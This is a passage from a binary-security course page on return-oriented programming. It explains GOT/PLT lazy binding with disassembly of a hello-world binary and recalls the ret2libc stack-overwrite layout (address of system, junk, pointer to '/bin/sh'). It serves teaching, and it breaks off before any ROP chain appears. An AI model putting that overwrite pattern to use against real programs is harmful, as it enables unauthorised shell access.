<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper docs-doc-page docs-version-current plugin-docs plugin-id-default docs-doc-id-Exploitation Techniques/Return-Oriented Programming/Reading/README">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v2.1.0">
<title data-rh="true">Return-Oriented Programming | Binary Security</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:url" content="http://open-education-hub.github.io/binary-security/Exploitation Techniques/Return-Oriented Programming/Reading/"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Return-Oriented Programming | Binary Security"><meta data-rh="true" name="description" content="Prerequisites"><meta data-rh="true" property="og:description" content="Prerequisites"><link data-rh="true" rel="canonical" href="http://open-education-hub.github.io/binary-security/Exploitation Techniques/Return-Oriented Programming/Reading/"><link data-rh="true" rel="alternate" href="http://open-education-hub.github.io/binary-security/Exploitation Techniques/Return-Oriented Programming/Reading/" hreflang="en"><link data-rh="true" rel="alternate" href="http://open-education-hub.github.io/binary-security/Exploitation Techniques/Return-Oriented Programming/Reading/" hreflang="x-default"><link rel="stylesheet" href="/binary-security/assets/css/styles.a69a9d41.css">
<link rel="preload" href="/binary-security/assets/js/runtime~main.74200969.js" as="script">
<link rel="preload" href="/binary-security/assets/js/main.d9be8505.js" as="script">
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){var t=null;try{t=localStorage.getItem("theme")}catch(t){}return t}();t(null!==e?e:"light")}()</script><div id="__docusaurus">
<div role="region" aria-label="theme.common.skipToMainContent"><a href="#" class="skipToContent_fXgn">Skip to main content</a></div><nav class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Navigation bar toggle" class="navbar__toggle clean-btn" type="button" tabindex="0"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/binary-security/"><div class="navbar__logo"><img src="/binary-security/img/logo.svg" alt="Logo" class="themedImage_ToTc themedImage--light_HNdA"><img src="/binary-security/img/logo.svg" alt="Logo" class="themedImage_ToTc themedImage--dark_i4oU"></div><b class="navbar__title text--truncate">Binary Security</b></a><a class="navbar__item navbar__link" href="/binary-security/Binary Analysis">Binary Analysis</a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/binary-security/Exploitation Techniques">Exploitation Techniques</a><a class="navbar__item navbar__link" href="/binary-security/Mitigation and Defensive Strategies">Mitigation and Defensive Strategies</a><a class="navbar__item navbar__link" href="/binary-security/Extra">Extra</a></div><div class="navbar__items navbar__items--right"><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="Switch between dark and light mode (currently light mode)" aria-label="Switch between dark and light mode (currently light mode)"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="searchBox_ZlJk"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div class="main-wrapper mainWrapper_z2l0 docsWrapper_BCFX"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docPage__5DB"><aside class="theme-doc-sidebar-container docSidebarContainer_b6E3"><div class="sidebar_njMd"><nav class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/binary-security/">Introduction</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" aria-expanded="false" href="/binary-security/Binary Analysis/">Binary Analysis</a><button aria-label="Toggle the collapsible sidebar category &#x27;Binary Analysis&#x27;" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" aria-expanded="true" href="/binary-security/Exploitation Techniques/">Exploitation Techniques</a><button aria-label="Toggle the collapsible sidebar category &#x27;Exploitation Techniques&#x27;" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" aria-expanded="false" tabindex="0" href="/binary-security/Exploitation Techniques/Buffer Exploitation/">Buffer Exploitation</a><button aria-label="Toggle the collapsible sidebar category &#x27;Buffer Exploitation&#x27;" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" aria-expanded="false" tabindex="0" href="/binary-security/Exploitation Techniques/Shellcodes/">Shellcodes</a><button aria-label="Toggle the collapsible sidebar category &#x27;Shellcodes&#x27;" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" aria-expanded="false" tabindex="0" href="/binary-security/Exploitation Techniques/Shellcodes Advanced/">Shellcodes Advanced</a><button aria-label="Toggle the collapsible sidebar category &#x27;Shellcodes Advanced&#x27;" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" aria-expanded="true" tabindex="0" href="/binary-security/Exploitation Techniques/Return-Oriented Programming/">Return-Oriented Programming</a><button aria-label="Toggle the collapsible sidebar category &#x27;Return-Oriented Programming&#x27;" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/binary-security/Exploitation Techniques/Return-Oriented Programming/Reading/">Reading</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" aria-expanded="false" tabindex="0" href="/binary-security/Exploitation Techniques/Return-Oriented Programming Advanced/">Return-Oriented Programming Advanced</a><button aria-label="Toggle the collapsible sidebar category &#x27;Return-Oriented Programming Advanced&#x27;" type="button" class="clean-btn menu__caret"></button></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" aria-expanded="false" href="/binary-security/Mitigation and Defensive Strategies/">Mitigation and Defensive Strategies</a><button aria-label="Toggle the collapsible sidebar category &#x27;Mitigation and Defensive Strategies&#x27;" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" aria-expanded="false" href="/binary-security/Extra/">Extra</a><button aria-label="Toggle the collapsible sidebar category &#x27;Extra&#x27;" type="button" class="clean-btn menu__caret"></button></div></li></ul></nav><button type="button" title="Collapse sidebar" aria-label="Collapse sidebar" class="button button--secondary button--outline collapseSidebarButton_PEFL"><svg width="20" height="20" aria-hidden="true" class="collapseSidebarButtonIcon_kv0_"><g fill="#7a7a7a"><path d="M9.992 10.023c0 .2-.062.399-.172.547l-4.996 7.492a.982.982 0 01-.828.454H1c-.55 0-1-.453-1-1 0-.2.059-.403.168-.551l4.629-6.942L.168 3.078A.939.939 0 010 2.528c0-.548.45-.997 1-.997h2.996c.352 0 .649.18.828.45L9.82 9.472c.11.148.172.347.172.55zm0 0"></path><path d="M19.98 10.023c0 .2-.058.399-.168.547l-4.996 7.492a.987.987 0 01-.828.454h-3c-.547 0-.996-.453-.996-1 0-.2.059-.403.168-.551l4.625-6.942-4.625-6.945a.939.939 0 01-.168-.55 1 1 0 01.996-.997h3c.348 0 .649.18.828.45l4.996 7.492c.11.148.168.347.168.55zm0 0"></path></g></svg></button></div></aside><main class="docMainContainer_gTbr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/binary-security/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_OVgt"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/binary-security/Exploitation Techniques/"><span itemprop="name">Exploitation Techniques</span></a><meta itemprop="position" content="1"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/binary-security/Exploitation Techniques/Return-Oriented Programming/"><span itemprop="name">Return-Oriented Programming</span></a><meta itemprop="position" content="2"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">Reading</span><meta itemprop="position" content="3"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><h1>Return-Oriented Programming</h1><h2 class="anchor anchorWithStickyNavbar_LWe7" id="prerequisites">Prerequisites<a class="hash-link" href="#prerequisites" title="Direct link to heading">​</a></h2><p>In order to fully grasp the content of this session, you should have a good
understanding of the following topics, both theoretically and practically:</p><ul><li>Stack frame</li><li>Shellcodes</li><li>ASLR</li><li>DEP</li><li><code>pwntools</code></li></ul><p>If you are unfamiliar with any of the above concepts or if your understanding of
them is fuzzy, go over their corresponding sessions once again, before you
proceed with the current session.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="recap---aslr">Recap - ASLR<a class="hash-link" href="#recap---aslr" title="Direct link to heading">​</a></h2><p>ASLR is not the only feature that prevents the compiler and the linker from solving some relocations before the binary is actually running.
Shared libraries can also be combined in different ways.
Thus, the time when the loader is running is actually the first time you get to know the address of a shared library.
The ASLR feature is orthogonal to this - the loader could choose to assign the addresses to libraries in a round-robin fashion, or could use ASLR to assign them randomly.</p><p>Of course, we might be inclined to have the loader simply fix all relocations in the code section after it loaded the libraries, but this breaks the memory access protection of the <code>.text</code> section, which should only be <strong>readable</strong> and <strong>executable</strong>.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="solution---got-and-plt">Solution - GOT and PLT<a class="hash-link" href="#solution---got-and-plt" title="Direct link to heading">​</a></h2><p>In order to solve this issue, we need another level of indirection.
Through this new level, all accesses to symbols located in shared libraries will read the actual address from a table at runtime.
This table is called the <strong>Global Offset Table (<code>.got</code>)</strong>.
The one who populates this table is the loader.
Note that this can work both for data accesses, as well as for function calls.
However, function calls are actually using a small stub (i.e., a few instructions) stored in the <strong>Procedure Linkage Table (<code>.plt</code>)</strong>.</p><p>The PLT is responsible of finding the shared library function address when it is first called (<strong>lazy binding</strong>), and writing it to a GOT entry.
Note that the function pointers are stored in <code>.got.plt</code>).
The following calls use the pre-resolved address.</p><p>Let&#x27;s take a quick look at the code generated for a shared library call.
We&#x27;ll be using the binary compiled from the code below, which simply calls <code>puts()</code>.</p><div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">include</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property string" style="color:#e3116c">&lt;stdio.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">void</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">puts</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;Hello world!&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>After compiling this code, let&#x27;s look at the call to <code>puts()</code>:</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ objdump -D -j .text -M intel hello | grep puts</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">80483e4:    e8 07 ff ff ff          call   80482f0 &lt;puts@plt&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>If we look at the <code>.plt</code> section, we see that it starts at address <code>0x080482e0</code>, right where the previous call jumps:</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ readelf --sections hello</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[...]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  [12] .plt              PROGBITS        080482e0 0002e0 000040 04  AX  0   0 16</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[...]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Now let&#x27;s see how the code in <code>.plt</code> looks like:</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ objdump -D -j .plt -M intel hello | grep -A 3 &#x27;&lt;puts@plt&gt;&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">080482f0 &lt;puts@plt&gt;:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 80482f0:   ff 25 00 a0 04 08       jmp    DWORD PTR ds:0x804a000</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 80482f6:   68 00 00 00 00          push   0x0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 80482fb:   e9 e0 ff ff ff          jmp    80482e0 &lt;_init+0x30&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We see this code performing a jump to address <code>0x804a000</code> inside the data section.
Let&#x27;s check the binary relocations for that location:</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ readelf --relocs hello</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[...]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Relocation section &#x27;.rel.plt&#x27; at offset 0x298 contains 3 entries:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> Offset     Info    Type            Sym.Value  Sym. Name</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0804a000  00000107 R_386_JUMP_SLOT   00000000   puts</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[...]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>OK, good, but what is actually stored at this address initially?</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ objdump -s -M intel -j .got.plt --start-address=0x0804a000 hello</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">hello:     file format elf32-i386</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Contents of section .got.plt:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 804a000 f6820408 06830408 16830408           ............</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We recognize <code>f6820408</code> (<code>0x80482f6</code>) as being the next instruction in the <code>puts@plt</code> stub that we disassembled above.
Which then pushes 0 in the stack and calls 0x80482e0.
This is the call to the one-time resolver, and it looks like this:</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ objdump -D -j .plt -M intel hello | grep -A 3 &#x27;080482e0&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">080482e0 &lt;puts@plt-0x10&gt;:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 80482e0:   ff 35 f8 9f 04 08       push   DWORD PTR ds:0x8049ff8</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 80482e6:   ff 25 fc 9f 04 08       jmp    DWORD PTR ds:0x8049ffc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 80482ec:   00 00                   add    BYTE PTR [eax],al</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>What&#x27;s going on here?
What&#x27;s actually happening is lazy binding - by convention when the dynamic linker loads a library, it will put an identifier and resolution function into known places in the GOT.
Therefore, what happens is roughly this: on the first call of a function, it falls through to call the default stub, it simply jumps to the next instruction.
The identifier is pushed on the stack, the dynamic linker is called, which at that point has enough information to figure out “hey, this program is trying to find the function foo”.
It will go ahead and find it, and then patch the address into the GOT such that the next time the original PLT entry is called, it will load the actual address of the function, rather than the lookup stub.
Ingenious!</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="further-inspection">Further Inspection<a class="hash-link" href="#further-inspection" title="Direct link to heading">​</a></h3><p>Going further into the resolver is left as an exercise.
You can use GDB to inspect the address in <code>0x8049ffc</code>, and what happens when this jumps there.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="return-oriented-programming-rop">Return Oriented Programming (<code>ROP</code>)<a class="hash-link" href="#return-oriented-programming-rop" title="Direct link to heading">​</a></h2><h3 class="anchor anchorWithStickyNavbar_LWe7" id="motivation">Motivation<a class="hash-link" href="#motivation" title="Direct link to heading">​</a></h3><p>In the previous sessions we discussed <code>ret2libc</code> attacks.
The standard attack was to perform an overwrite in the following way:</p><div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">RET + 0x00:   addr of system</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RET + 0x04:   JUNK</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RET + 0x08:   address to desired command (e.g. &#x27;/bin/sh&#x27;)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>However, what happens when you need to call multiple functions?
